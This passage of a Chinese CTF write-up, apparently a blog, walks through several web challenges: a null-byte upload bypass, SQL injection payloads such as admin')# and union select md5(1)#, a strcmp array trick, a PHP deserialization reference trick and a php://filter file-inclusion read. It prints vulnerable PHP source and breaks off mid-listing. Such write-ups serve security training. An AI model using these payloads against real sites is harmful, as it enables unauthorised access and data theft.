class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示必须上传php格式文件</p><p>再试着上传php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示上传不了，看一下二者共同有的信息是一个数组Array,里面有文件名后缀，推测是先对文件后缀名检测，如果不是jpg,png，则过滤</p><p>试着burp抓包修改文件名为demo.png.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>很明显服务器是最后的后缀名检测，再尝试php5,Php等都不行</p><p>所以只能后缀名是png,jpg的文件才能成功上传，然后我们需要想办法让服务器认为这是一个php文件</p><p>上传png文件后的信息看到了basename，猜测跟目录有关，basename这个函数是将路径中的文件名取出，并且我们之前查看源代码也看到了提交了隐藏的目录信息</p><p>我们先试着修改目录，将/uploads/修改成/uploads/demo.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现文件名也跟随着目录值而改变了，所以我们猜测服务器就是根据basename后的文件名进行检测是不是php文件</p><p>经过查询，basename是可以用十六进制的00截断的</p><p>我们将/uploads/修改成/uploads/demo.php (后面有个空格)</p><p>然后在burp的Hex中将对应的20(空格)修改成00</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到flag</p><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>网址：<a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.php</a></p><p><a href="http://chinalover.sinaapp.com/index.phps给出了源代码" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.phps给出了源代码</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">Secure Web Login</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=&quot;Username&quot;&gt;</span><br><span class="line">&lt;input type=password name=pass value=&quot;Password&quot;&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>从源代码看出用户名为admin,且密码是正确的密码才能返回flag</p><p>但是对我们POST的参数user毫无过滤，我们只需要POST参数user=admin’)#即可获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h3><p>网址：<a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a></p><p>给出了源代码提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=@$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag的条件是strcmp()函数返回0，即两个变量比较结果相等，我们不知道$pass1变量的值，但是strcmp函数处理数组时会返回NULL</p><p>所以我们POST参数pass[]=</p><p>即可拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h3><p>网址：<a href="http://chinalover.sinaapp.com/web12/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php</a></p><p>给出了源代码提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对我们GET的参数key进行了检查，不能包含[1-9]任意一个字符，否则就拿不到flag，key值要等于54975581388，可以考虑转化为十六进制，54975581388 的十六进制为0xccccccccc</p><p>输入key=0xccccccccc</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h3><p>这题服务器崩了，只能本地搭环境演示</p><p>给出了源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $enter;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    $pass = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $pass=stripslashes($pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">        $o-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先创建了一个类，然后接受GET参数pass，并且对pass进行了去掉转义的处理，get_magic_quotes_gpc()是检查是否对变量有转义处理，如果返回1则说明有转义处理，那么执行stripslashes函数，去掉转义，然后对pass参数进行反转义处理，然后检查对象o的secret变量是否全等于对象o的enter变量，如果相等则输出flag，可是我们不知道enter变量的值，所以我们可以考虑使用引用处理</p><p>例如$a =&amp; $b，则$a和$b指向同一个值，当$a的值变化时，$b的值也随之变化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a =&amp; $b;</span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b; <span class="comment">//$b=1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a; <span class="comment">//$a=2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所以我们使$o-&gt;enter =&amp; $o-&gt;secret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = new just4fun();</span><br><span class="line">$o-&gt;enter =&amp; $o-&gt;secret;</span><br><span class="line">$pass = serialize($o);</span><br><span class="line">echo $pass;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到序列化的$pass，然后将这个pass GET给服务器</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/40.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到flag</p><h3 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h3><p>网址：<a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a></p><p>给出了源代码提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">if(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先需要了解htmlentities() 函数：把字符转换为 HTML 实体 </p><p>而htmlentities($str, ENT_QUOTES); 是 转换双引号和单引号</p><p>我们看个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$username='</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$password='</span>.$password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们试着GET参数username=’admin’，password=”1”</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器页面上看还是单引号和双引号，而看下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现就不是原来的单引号和双引号了，相等于转变成了其他字符，而我们要进行sql注入，就必须闭合单引号</p><p>既然没办法通过输入单引号来闭合单引号，那么还可以通过转义单引号的方法</p><p>试着输入username=\,password= or 1=1 %23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以此时的sql语句是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1=1#&apos;;</span><br></pre></td></tr></table></figure><p>可以看到一个单引号被转义，name=后的单引号和pass=后的单引号闭合了，我们再构造or 1=1语句构造恒真语句</p><p>这样就必定有查询结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/44.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后拿到flag</p><h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a></p><p>页面是一串jsfuck代码，拿到解码网站解码后结果是1bc29b36f623ba82aaf6724fd3b16718.php </p><p>访问<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a> </p><p>页面显示提示在脑袋里，马上抓包看看响应头，发现tip: history of bash</p><p>查询bash：Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</p><p>那么我们访问<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/45.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现命令zip -r flagbak.zip，解压过压缩包，那我们访问<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip下载压缩包" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip下载压缩包</a></p><p>获得flag is:nctf{bash_history_means_what}</p><h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>网址：<a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web6/index.php</a></p><p>给出了源代码提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿到flag条件是查询的结果和我们POST的参数pass的md5值一样，服务器对我们post的参数user没有过滤，根据提示，我们使用union注入控制查询结果，使之和pass的md5值相等</p><p>payloads:user=’ union select md5(1)#&amp;pass=1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/46.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h3><p>网址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">http://cms.nuptzj.cn/</a></p><p>题目给出了提示这题不是xss，浏览源代码，发现说明文件<a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=sm.txt</a></p><p>看到file参数，猜测可能存在文件包含漏洞，试着用php://fileter读取about.php源代码</p><p>解码得about.php源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">if($file==&quot;&quot; || strstr($file,&apos;config.php&apos;))&#123;</span><br><span class="line">echo &quot;fileåæ°ä¸è½ä¸ºç©ºï¼&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$cut=strchr($file,&quot;loginxlcteam&quot;);</span><br><span class="line">if($cut==false)&#123;</span><br><span class="line">$data=file_get_contents($file);</span><br><span class="line">$date=htmlspecialchars($data);</span><br><span class="line">echo $date;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;ææç®å½ï¼ç¦æ­¢æ¥çï¼ä½æ¯ããã&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看看say.php源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line">$nice=$_POST[&apos;nice&apos;];</span><br><span class="line">$say=$_POST[&apos;usersay&apos;];</span><br><span class="line">if(!isset($_COOKIE[&apos;username&apos;]))&#123;</span><br><span class="line">setcookie(&apos;username&apos;,$nice);</span><br><span class="line">setcookie(&apos;userpass&apos;,&apos;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$username=$_COOKIE[&apos;username&apos;];</span><br><span class="line">$userpass=$_COOKIE[&apos;userpass&apos;];</span><br><span class="line">if($nice==&quot;&quot; || $say==&quot;&quot;)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;æµç§°æçè¨åå®¹ä¸è½ä¸ºç©ºï¼(å¦ææåå®¹ä¹å¼¹åºæ­¤æ¡ï¼ä¸æ¯ç½ç«é®é¢å~ å¥½å§ï¼ç»ä¸ªæç¤ºï¼æ¥çé¡µé¢æºç ææåï¼)&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼&quot;.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$nice=mysql_real_escape_string($nice);</span><br><span class="line">$username=mysql_real_escape_string($username);</span><br><span class="line">$userpass=mysql_real_escape_string($userpass);</span><br><span class="line">$result=mysql_query(&quot;SELECT username FROM admin where username=&apos;$nice&apos;&quot;,$con);</span><br><span class="line">$login=mysql_query(&quot;SELECT * FROM admin where username=&apos;$username&apos; AND userpass=&apos;$userpass&apos;&quot;,$con);</span><br><span class="line">if(mysql_num_rows($result)&gt;0 &amp;&amp; mysql_num_rows($login)&lt;=0)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;æµç§°å·²è¢«ä½¿ç¨ï¼è¯·æ´æ¢ï¼&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_close($con);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">$say=mysql_real_escape_string($say);</span><br><span class="line">mysql_query(&quot;insert into message (nice,say,display) values(&apos;$nice&apos;,&apos;$say&apos;,0)&quot;,$con);</span><br><span class="line">mysql_close($con);</span><br><span class="line">echo &apos;&lt;script&gt;alert(&quot;æå»ºåè°ç¤¾ä¼ï¼çè¨éè¦ç»è¿ç®¡çåå®¡æ ¸æå¯ä»¥æ¾ç¤ºï¼&quot;);window.location = &quot;./index.php&quot;&lt;/script&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对我们输入的参数都加以转义，没什么漏洞，继续看看还有什么文件，再源代码中还发现了so.php文件</p><p>看看它的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 